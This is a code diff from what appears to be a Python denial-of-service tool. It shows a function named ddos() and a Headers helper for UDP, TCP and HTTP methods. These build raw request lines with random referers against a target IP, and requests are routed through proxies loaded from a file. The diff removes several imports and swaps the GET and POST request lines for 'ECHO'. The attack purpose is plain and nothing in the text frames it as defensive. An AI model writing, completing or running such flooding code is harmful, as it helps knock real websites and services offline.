@@ -3,12 +3,6 @@ import os, socket, threading, colorsys, time, random
 import socket
 import sys
 from os import system, name
-import httpx
-from httpx import AsyncClient, Headers
-import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random, socket
-import socket
-from urllib.parse import urlparse
-from requests.cookies import RequestsCookieJar
 from sys import stdout
 from colorama import Fore, init
 import sys
@@ -2411,9 +2405,9 @@ def get_proxies():
 def Headers(method):
     header = "UDP"
     if method == "UDP" or method == "TCP" or method == "HTTP":
-        get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
-        post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
-        get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
+        get_host = "ECHO HTTP/1.1\r\nHost: " + ip + "\r\n"
+        post_host = "ECHO HTTP/1.1\r\nHost: " + ip + "\r\n"
+        get_data = "ECHO https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
         referer = "Referer: " + random.choice(referers) + ip + "\r\n"
         connection = "Connection: Keep-Alive\r\n" + "\r\n"
         content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
@@ -2435,9 +2429,9 @@ def Headers(method):
     return header
 
 def ddos():
-    get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
-    post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
-    get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
+    get_host = "ECHO HTTP/1.1\r\nHost: " + ip + "\r\n"
+    post_host = "ECHO HTTP/1.1\r\nHost: " + ip + "\r\n"
+    get_data = "ECHO https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
     referer = "Referer: " + random.choice(referers) + ip + "\r\n"
     connection = "Connection: Keep-Alive\r\n" + "\r\n"
     proxies = open("proxies.txt", 'r').read().split('\n')
